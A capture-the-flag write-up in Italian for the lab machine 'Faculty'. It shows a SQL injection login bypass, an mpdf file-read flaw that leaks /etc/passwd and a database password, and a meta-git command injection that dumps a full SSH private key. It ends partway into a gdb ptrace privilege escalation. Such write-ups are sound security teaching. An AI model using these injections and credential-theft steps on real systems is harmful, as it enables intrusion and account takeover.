# Faculty
* **POINTS**: 30
* **USER RATING**: Medium
* **OPERATING SYSTEM**: Linux
* **RATING**: 4.6

## 1. Recon
```shell
└─$ nmap -sC -sV -oA nmap/initial 10.10.11.169
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-09 05:00 EDT
Nmap scan report for 10.10.11.169
Host is up (0.12s latency).
Not shown: 992 closed tcp ports (conn-refused)
PORT      STATE    SERVICE     VERSION
22/tcp    open     ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e9:41:8c:e5:54:4d:6f:14:98:76:16:e7:29:2d:02:16 (RSA)
|   256 43:75:10:3e:cb:78:e9:52:0e:eb:cf:7f:fd:f6:6d:3d (ECDSA)
|_  256 c1:1c:af:76:2b:56:e8:b3:b8:8a:e9:69:73:7b:e6:f5 (ED25519)
80/tcp    open     http        nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://faculty.htb
4449/tcp  filtered privatewire
5810/tcp  filtered unknown
5815/tcp  filtered unknown
6646/tcp  filtered unknown
6969/tcp  filtered acmsoda
23502/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.81 seconds
```

## 1.1 School Faculty Scheduling System - TCP 80
![web](Images/Web.png)

La pagina si chiama *login.php* quindi proviamo una SQLInj `' or 1=1-- -` -> entriamo ma non siamo admin

Vediamo se ci sono altri endpoint con *gobuster*:

```shell
└─$ gobuster dir -u faculty.htb -w ~/Scaricati/SecLists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://faculty.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/asd/Scaricati/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/07/09 10:55:55 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 178] [--> http://faculty.htb/admin/]
/index.php            (Status: 302) [Size: 12193] [--> login.php]              
                                                                               
===============================================================
2022/07/09 10:57:00 Finished
===============================================================
```

Andando sull'endpoint */admin* abbiamo una form di login 

<p align="center">
  <img src="Images/login.png" />
</p>

Si supera di nuovo con una SQLInj ed ora sia admin !

![admin](Images/admin.png)

Nella pagina *Faculty List* troviamo la lista delle facoltà 

![faculty](Images/faculty.png)

Si può scaricare la lista... ma la cosa interessante è cosa utilizza per creare il PDF

![pdf](Images/pdf.png)

## 2. LFI
Cercando su Google ho trovato un [forum di Git](https://github.com/mpdf/mpdf/issues/356) dove si parla del fatto che mpdf è vulnerabile a LFI.

### 2.1 PoC
#
Prendendo il payload della pagina, facendo il base64 e mettendolo in burp possiamo verificare la presenza di LFI

![poc](Images/POC.png)

Abbiamo il link

<p align="center">
  <img src="Images/passwd.png" />
</p>

Abbiamo il contenuto di */etc/passwd*:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:112:117:MySQL Server,,,:/nonexistent:/bin/false
gbyolo:x:1000:1000:gbyolo:/home/gbyolo:/bin/bash
postfix:x:113:119::/var/spool/postfix:/usr/sbin/nologin
developer:x:1001:1002:,,,:/home/developer:/bin/bash
usbmux:x:114:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
```

Arrivati a questo punto abbiamo la possibilità di leggere qualsiasi file (tranne quelli con permessi da superutente o non dell'utente corrente); iniziamo leggendo *login.php* e troviamo subito una cosa molto interessante:

```php
<?php 
session_start();
include('./db_connect.php');
ob_start();
ob_end_flush();
?>
```

Abbiamo la connessione ad un db quindi ci leggiamo *db_connect.php* per vedere se ci sono credenziali:

```php
<?php 
$conn= new mysqli('localhost','sched','Co.met06aci.dly53ro.per','scheduling_db')or die("Could not connect to mysql".mysqli_error($con));
?>
```

## 3. SSH gbyolo
Perfetto abbiamo la password di un utente, quindi in */etc/passwd* vediamo i possibili candidati:

```shell
└─$ cat passwd | grep sh
root:x:0:0:root:/root:/bin/bash
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
gbyolo:x:1000:1000:gbyolo:/home/gbyolo:/bin/bash
developer:x:1001:1002:,,,:/home/developer:/bin/bash
```

Escludendo *root* e *sshd* rimangono solo 2 utenti e provando con *gbyolo* si ha l'accesso.

```shell
└─$ ssh gbyolo@faculty.htb
The authenticity of host 'faculty.htb (10.10.11.169)' can't be established.
ED25519 key fingerprint is SHA256:JYKRgj5yk9qD3GxSCsRAgUIBAhmTssq961F3rHxWlnY.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'faculty.htb' (ED25519) to the list of known hosts.
gbyolo@faculty.htb's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-121-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Jul  9 17:46:12 CEST 2022

  System load:           0.06
  Usage of /:            74.7% of 4.67GB
  Memory usage:          34%
  Swap usage:            0%
  Processes:             224
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.169
  IPv6 address for eth0: dead:beef::250:56ff:feb9:cb0a


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

You have mail.
gbyolo@faculty:~$
```

Però non abbiamo i permessi necessari affinchè si possa leggere la user flag; proviamo ad elevare i nostri privilegi:

```shell
gbyolo@faculty:~$ sudo -l
[sudo] password for gbyolo: 
Matching Defaults entries for gbyolo on faculty:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User gbyolo may run the following commands on faculty:
    (developer) /usr/local/bin/meta-git
```

## 4. RCE
Ho cercato su Google le vulnerabilità di *meta-git* e ho trovato un [articolo](https://hackerone.com/reports/728040) che parla di RCE e spiega come effettuare l'attacco.

### 4.1 PoC
Ho provato quindi a verificare se funzionasse con *whoami* (però solo in una directory dove *developer* può accedere => root) 

```shell
gbyolo@faculty:/$ sudo -u developer meta-git clone 'poc | whoami'
meta git cloning into 'poc | whoami' at poc | whoami

poc | whoami:
fatal: repository 'poc' does not exist
developer
whoami: extra operand ‘poc’
Try 'whoami --help' for more information.
poc | whoami ✓
```

Una volta constato che l'attacco funziona, andiamo ci prendiamo la chiave ssh

```shell
gbyolo@faculty:/$ sudo -u developer meta-git clone 'poc | cat ~/.ssh/id_rsa'
meta git cloning into 'poc | cat ~/.ssh/id_rsa' at id_rsa

id_rsa:
fatal: repository 'poc' does not exist
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

## 5. SSH developer

```shell
└─$ ssh -i key.priv developer@faculty.htb
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-121-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Jul  9 17:58:38 CEST 2022                                                            
                                                                                                                    
  System load:           0.01                                                                                       
  Usage of /:            74.9% of 4.67GB                                                                            
  Memory usage:          37%                                                                                        
  Swap usage:            0%                                                                                         
  Processes:             228                                                                                        
  Users logged in:       1                                                                                          
  IPv4 address for eth0: 10.10.11.169                                                                               
  IPv6 address for eth0: dead:beef::250:56ff:feb9:cb0a                                                              
                                                                                                                    
                                                                                                                    
0 updates can be applied immediately.                                                                               
                                                                                                                    
                                                                                                                    
The list of available updates is more than a week old.                                                              
To check for new updates run: sudo apt update                                                                       
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings                                                                                                                   
                                                                                                                    
                                                                                                                    
developer@faculty:~$
```

Abbiamo quindi la user flag: `a866ff5be3bca73f10eab3bb95c694e7`

## 6. Privilege Escalation
Facendo enumerazione si nota la presenza di un ulteriore gruppo: 

```shell
developer@faculty:/tmp$ groups 
developer debug faculty
```

Cerchiamo i processi che vengono eseguiti sotto questo gruppo e non c'è ne sono, quindi cerchiamo i programmi: 

```shell
developer@faculty:/tmp$ find / -group debug 2>/dev/null
/usr/bin/gdb
```

Vediamo le capabilities associate:

```shell
developer@faculty:/tmp$ getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace+ep
```

**Background**  
  CAP_SYS_PTRACE
* Trace arbitrary processes using ptrace(2);
* apply get_robust_list(2) to arbitrary processes;
* transfer data to or from the memory of arbitrary processes using process_vm_readv(2) and process_vm_writev(2);
* inspect processes using kcmp(2). 

Perfetto... possiamo attaccarci a qualsiasi processo.

L'idea è: attaccare gdb ad un processo che gira da *root* e che sia linkato dinamicamenete alla libc così da poter chiamare *system* e quindi cambiare i permessi a */bin/bash*.

Bisogna trovare solo il processo corretto:

```shell
developer@faculty:/tmp$ ps auxww | grep ^root
root           1  0.0  0.5 170024 11436 ?        Ss   16:34   0:05 /sbin/init maybe-ubiquity
root           2  0.0  0.0      0     0 ?        S    16:34   0:00 [kthreadd]
root           3  0.0  0.0      0     0 ?        I<   16:34   0:00 [rcu_gp]
root           4  0.0  0.0      0     0 ?        I<   16:34   0:00 [rcu_par_gp]
root           6  0.0  0.0      0     0 ?        I<   16:34   0:00 [kworker/0:0H-kblockd]
root           9  0.0  0.0      0     0 ?        I<   16:34   0:00 [mm_percpu_wq]
root          10  0.0  0.0      0     0 ?        S    16:34   0:00 [ksoftirqd/0]
root          11  0.0  0.0      0     0 ?        I    16:34   0:01 [rcu_sched]
root          12  0.0  0.0      0     0 ?        S    16:34   0:00 [migration/0]
root          13  0.0  0.0      0     0 ?        S    16:34   0:00 [idle_inject/0]
root          14  0.0  0.0      0     0 ?        S    16:34   0:00 [cpuhp/0]
root          15  0.0  0.0      0     0 ?        S    16:34   0:00 [cpuhp/1]
root          16  0.0  0.0      0     0 ?        S    16:34   0:00 [idle_inject/1]
root          17  0.0  0.0      0     0 ?        S    16:34   0:00 [migration/1]
root          18  0.0  0.0      0     0 ?        S    16:34   0:00 [ksoftirqd/1]
root          20  0.0  0.0      0     0 ?        I<   16:34   0:00 [kworker/1:0H-kblockd]
root          21  0.0  0.0      0     0 ?        S    16:34   0:00 [kdevtmpfs]
root          22  0.0  0.0      0     0 ?        I<   16:34   0:00 [netns]
root          23  0.0  0.0      0     0 ?        S    16:34   0:00 [rcu_tasks_kthre]
root          24  0.0  0.0      0     0 ?        S    16:34   0:00 [kauditd]
root          26  0.0  0.0      0     0 ?        S    16:34   0:00 [khungtaskd]
root          27  0.0  0.0      0     0 ?        S    16:34   0:00 [oom_reaper]
root          28  0.0  0.0      0     0 ?        I<   16:34   0:00 [writeback]
root          29  0.0  0.0      0     0 ?        S    16:34   0:00 [kcompactd0]
root          30  0.0  0.0      0     0 ?        SN   16:34   0:00 [ksmd]
root          31  0.0  0.0      0     0 ?        SN   16:34   0:00 [khugepaged]
root          78  0.0  0.0      0     0 ?        I<   16:34   0:00 [kintegrityd]
root          79  0.0  0.0      0     0 ?        I<   16:34   0:00 [kblockd]
root          80  0.0  0.0      0     0 ?        I<   16:34   0:00 [blkcg_punt_bio]
root          81  0.0  0.0      0     0 ?        I<   16:34   0:00 [tpm_dev_wq]
root          82  0.0  0.0      0     0 ?        I<   16:34   0:00 [ata_sff]
root          83  0.0  0.0      0     0 ?        I<   16:34   0:00 [md]
root          84  0.0  0.0      0     0 ?        I<   16:34   0:00 [edac-poller]
root          85  0.0  0.0      0     0 ?        I<   16:34   0:00 [devfreq_wq]
root          86  0.0  0.0      0     0 ?        S    16:34   0:00 [watchdogd]
root          89  0.0  0.0      0     0 ?        S    16:34   0:00 [kswapd0]
root          90  0.0  0.0      0     0 ?        S    16:34   0:00 [ecryptfs-kthrea]
root          92  0.0  0.0      0     0 ?        I<   16:34   0:00 [kthrotld]
root          93  0.0  0.0      0     0 ?        S    16:34   0:00 [irq/24-pciehp]
root          94  0.0  0.0      0     0 ?        S    16:34   0:00 [irq/25-pciehp]
root          95  0.0  0.0      0     0 ?        S    16:34   0:00 [irq/26-pciehp]
root          96  0.0  0.0      0     0 ?        S    16:34   0:00 [irq/27-pciehp]
root          97  0.0  0.0      0     0 ?        S    16:34   0:00 [irq/28-pciehp]
root          98  0.0  0.0      0     0 ?        S    16:34   0:00 [irq/29-pciehp]
root          99  0.0  0.0      0     0 ?        S    16:34   0:00 [irq/30-pciehp]
root         100  0.0  0.0      0     0 ?        S    16:34   0:00 [irq/31-pciehp]
root         101  0.0  0.0      0     0 ?        S    16:34   0:00 [irq/32-pciehp]
root         102  0.0  0.0      0     0 ?        S    16:34   0:00 [irq/33-pciehp]
root         103  0.0  0.0      0     0 ?        S    16:34   0:00 [irq/34-pciehp]
root         104  0.0  0.0      0     0 ?        S    16:34   0:00 [irq/35-pciehp]
root         105  0.0  0.0      0     0 ?        S    16:34   0:00 [irq/36-pciehp]
root         106  0.0  0.0      0     0 ?        S    16:34   0:00 [irq/37-pciehp]
root         107  0.0  0.0      0     0 ?        S    16:34   0:00 [irq/38-pciehp]
root         108  0.0  0.0      0     0 ?        S    16:34   0:00 [irq/39-pciehp]
root         109  0.0  0.0      0     0 ?        S    16:34   0:00 [irq/40-pciehp]
root         110  0.0  0.0      0     0 ?        S    16:34   0:00 [irq/41-pciehp]
root         111  0.0  0.0      0     0 ?        S    16:34   0:00 [irq/42-pciehp]
root         112  0.0  0.0      0     0 ?        S    16:34   0:00 [irq/43-pciehp]
root         113  0.0  0.0      0     0 ?        S    16:34   0:00 [irq/44-pciehp]
root         114  0.0  0.0      0     0 ?        S    16:34   0:00 [irq/45-pciehp]
root         115  0.0  0.0      0     0 ?        S    16:34   0:00 [irq/46-pciehp]
root         116  0.0  0.0      0     0 ?        S    16:34   0:00 [irq/47-pciehp]
root         117  0.0  0.0      0     0 ?        S    16:34   0:00 [irq/48-pciehp]
root         118  0.0  0.0      0     0 ?        S    16:34   0:00 [irq/49-pciehp]
root         119  0.0  0.0      0     0 ?        S    16:34   0:00 [irq/50-pciehp]
root         120  0.0  0.0      0     0 ?        S    16:34   0:00 [irq/51-pciehp]
root         121  0.0  0.0      0     0 ?        S    16:34   0:00 [irq/52-pciehp]
root         122  0.0  0.0      0     0 ?        S    16:34   0:00 [irq/53-pciehp]
root         123  0.0  0.0      0     0 ?        S    16:34   0:00 [irq/54-pciehp]
root         124  0.0  0.0      0     0 ?        S    16:34   0:00 [irq/55-pciehp]
root         125  0.0  0.0      0     0 ?        I<   16:34   0:00 [acpi_thermal_pm]
root         126  0.0  0.0      0     0 ?        S    16:34   0:00 [scsi_eh_0]
root         127  0.0  0.0      0     0 ?        I<   16:34   0:00 [scsi_tmf_0]
root         128  0.0  0.0      0     0 ?        S    16:34   0:00 [scsi_eh_1]
root         129  0.0  0.0      0     0 ?        I<   16:34   0:00 [scsi_tmf_1]
root         131  0.0  0.0      0     0 ?        I<   16:34   0:00 [vfio-irqfd-clea]
root         132  0.0  0.0      0     0 ?        I<   16:34   0:00 [ipv6_addrconf]
root         142  0.0  0.0      0     0 ?        I<   16:34   0:00 [kstrp]
root         145  0.0  0.0      0     0 ?        I<   16:34   0:00 [kworker/u257:0]
root         158  0.0  0.0      0     0 ?        I<   16:34   0:00 [charger_manager]
root         198  0.0  0.0      0     0 ?        S    16:34   0:00 [scsi_eh_2]
root         199  0.0  0.0      0     0 ?        I<   16:34   0:00 [mpt_poll_0]
root         200  0.0  0.0      0     0 ?        I<   16:34   0:00 [scsi_tmf_2]
root         201  0.0  0.0      0     0 ?        S    16:34   0:00 [scsi_eh_3]
root         202  0.0  0.0      0     0 ?        I<   16:34   0:00 [scsi_tmf_3]
root         203  0.0  0.0      0     0 ?        I<   16:34   0:00 [mpt/0]
root         204  0.0  0.0      0     0 ?        S    16:34   0:00 [scsi_eh_4]
root         205  0.0  0.0      0     0 ?        I<   16:34   0:00 [scsi_tmf_4]
root         206  0.0  0.0      0     0 ?        S    16:34   0:00 [scsi_eh_5]
root         207  0.0  0.0      0     0 ?        I<   16:34   0:00 [scsi_tmf_5]
root         208  0.0  0.0      0     0 ?        S    16:34   0:00 [scsi_eh_6]
root         209  0.0  0.0      0     0 ?        I<   16:34   0:00 [scsi_tmf_6]
root         210  0.0  0.0      0     0 ?        S    16:34   0:00 [scsi_eh_7]
root         211  0.0  0.0      0     0 ?        S    16:34   0:00 [irq/16-vmwgfx]
root         212  0.0  0.0      0     0 ?        I<   16:34   0:00 [ttm_swap]
root         213  0.0  0.0      0     0 ?        I<   16:34   0:00 [cryptd]
root         214  0.0  0.0      0     0 ?        I<   16:34   0:00 [scsi_tmf_7]
root         215  0.0  0.0      0     0 ?        S    16:34   0:00 [scsi_eh_8]
root         217  0.0  0.0      0     0 ?        I<   16:34   0:00 [scsi_tmf_8]
root         221  0.0  0.0      0     0 ?        S    16:34   0:00 [scsi_eh_9]
root         226  0.0  0.0      0     0 ?        I<   16:34   0:00 [scsi_tmf_9]
root         230  0.0  0.0      0     0 ?        S    16:34   0:00 [scsi_eh_10]
root         233  0.0  0.0      0     0 ?        I<   16:34   0:00 [scsi_tmf_10]
root         237  0.0  0.0      0     0 ?        S    16:34   0:00 [scsi_eh_11]
root         238  0.0  0.0      0     0 ?        I<   16:34   0:00 [scsi_tmf_11]
root         239  0.0  0.0      0     0 ?        S    16:34   0:00 [scsi_eh_12]
root         240  0.0  0.0      0     0 ?        I<   16:34   0:00 [scsi_tmf_12]
root         241  0.0  0.0      0     0 ?        S    16:34   0:00 [scsi_eh_13]
root         242  0.0  0.0      0     0 ?        I<   16:34   0:00 [scsi_tmf_13]
root         243  0.0  0.0      0     0 ?        S    16:34   0:00 [scsi_eh_14]
root         244  0.0  0.0      0     0 ?        I<   16:34   0:00 [scsi_tmf_14]
root         245  0.0  0.0      0     0 ?        S    16:34   0:00 [scsi_eh_15]
root         246  0.0  0.0      0     0 ?        I<   16:34   0:00 [scsi_tmf_15]
root         247  0.0  0.0      0     0 ?        S    16:34   0:00 [scsi_eh_16]
root         248  0.0  0.0      0     0 ?        I<   16:34   0:00 [scsi_tmf_16]
root         249  0.0  0.0      0     0 ?        S    16:34   0:00 [scsi_eh_17]
root         250  0.0  0.0      0     0 ?        I<   16:34   0:00 [scsi_tmf_17]
root         251  0.0  0.0      0     0 ?        S    16:34   0:00 [scsi_eh_18]
root         252  0.0  0.0      0     0 ?        I<   16:34   0:00 [scsi_tmf_18]
root         253  0.0  0.0      0     0 ?        S    16:34   0:00 [scsi_eh_19]
root         254  0.0  0.0      0     0 ?        I<   16:34   0:00 [scsi_tmf_19]
root         255  0.0  0.0      0     0 ?        S    16:34   0:00 [scsi_eh_20]
root         256  0.0  0.0      0     0 ?        I<   16:34   0:00 [scsi_tmf_20]
root         257  0.0  0.0      0     0 ?        S    16:34   0:00 [scsi_eh_21]
root         258  0.0  0.0      0     0 ?        I<   16:34   0:00 [scsi_tmf_21]
root         259  0.0  0.0      0     0 ?        S    16:34   0:00 [scsi_eh_22]
root         260  0.0  0.0      0     0 ?        I<   16:34   0:00 [scsi_tmf_22]
root         261  0.0  0.0      0     0 ?        S    16:34   0:00 [scsi_eh_23]
root         262  0.0  0.0      0     0 ?        I<   16:34   0:00 [scsi_tmf_23]
root         263  0.0  0.0      0     0 ?        S    16:34   0:00 [scsi_eh_24]
root         264  0.0  0.0      0     0 ?        I<   16:34   0:00 [scsi_tmf_24]
root         265  0.0  0.0      0     0 ?        S    16:34   0:00 [scsi_eh_25]
root         266  0.0  0.0      0     0 ?        I<   16:34   0:00 [scsi_tmf_25]
root         267  0.0  0.0      0     0 ?        S    16:34   0:00 [scsi_eh_26]
root         268  0.0  0.0      0     0 ?        I<   16:34   0:00 [scsi_tmf_26]
root         269  0.0  0.0      0     0 ?        S    16:34   0:00 [scsi_eh_27]
root         272  0.0  0.0      0     0 ?        I<   16:34   0:00 [scsi_tmf_27]
root         275  0.0  0.0      0     0 ?        S    16:34   0:00 [scsi_eh_28]
root         276  0.0  0.0      0     0 ?        I<   16:34   0:00 [scsi_tmf_28]
root         278  0.0  0.0      0     0 ?        S    16:34   0:00 [scsi_eh_29]
root         280  0.0  0.0      0     0 ?        I<   16:34   0:00 [scsi_tmf_29]
root         282  0.0  0.0      0     0 ?        S    16:34   0:00 [scsi_eh_30]
root         284  0.0  0.0      0     0 ?        I<   16:34   0:00 [scsi_tmf_30]
root         286  0.0  0.0      0     0 ?        S    16:34   0:00 [scsi_eh_31]
root         287  0.0  0.0      0     0 ?        I<   16:34   0:00 [scsi_tmf_31]
root         322  0.0  0.0      0     0 ?        S    16:34   0:00 [scsi_eh_32]
root         323  0.0  0.0      0     0 ?        I<   16:34   0:00 [scsi_tmf_32]
root         327  0.0  0.0      0     0 ?        I<   16:34   0:00 [kworker/1:1H-kblockd]
root         356  0.0  0.0      0     0 ?        I<   16:34   0:00 [raid5wq]
root         407  0.0  0.0      0     0 ?        I<   16:34   0:00 [kworker/0:1H-kblockd]
root         408  0.0  0.0      0     0 ?        S    16:34   0:00 [jbd2/sda2-8]
root         409  0.0  0.0      0     0 ?        I<   16:34   0:00 [ext4-rsv-conver]
root         467  0.0  0.7  68516 15728 ?        S<s  16:34   0:00 /lib/systemd/systemd-journald
root         485  0.0  0.0      0     0 ?        I<   16:34   0:00 [ipmi-msghandler]
root         495  0.0  0.2  22476  5860 ?        Ss   16:34   0:01 /lib/systemd/systemd-udevd
root         614  0.0  0.0      0     0 ?        I<   16:34   0:00 [kaluad]
root         615  0.0  0.0      0     0 ?        I<   16:34   0:00 [kmpath_rdacd]
root         616  0.0  0.0      0     0 ?        I<   16:34   0:00 [kmpathd]
root         617  0.0  0.0      0     0 ?        I<   16:34   0:00 [kmpath_handlerd]
root         618  0.0  0.9 214668 17996 ?        SLsl 16:34   0:00 /sbin/multipathd -d -s
root         655  0.0  0.5  46324 10604 ?        Ss   16:34   0:00 /usr/bin/VGAuthService
root         661  0.0  0.4 236524  8404 ?        Ssl  16:34   0:05 /usr/bin/vmtoolsd
root         671  0.0  0.2  99896  5804 ?        Ssl  16:34   0:00 /sbin/dhclient -1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
root         695  0.0  0.4 238080  9164 ?        Ssl  16:34   0:00 /usr/lib/accountsservice/accounts-daemon
root         719  0.0  0.1  81956  3672 ?        Ssl  16:34   0:00 /usr/sbin/irqbalance --foreground
root         720  0.0  0.9  26896 18108 ?        Ss   16:34   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root         724  0.0  0.4 236436  9176 ?        Ssl  16:34   0:00 /usr/lib/policykit-1/polkitd --no-debug
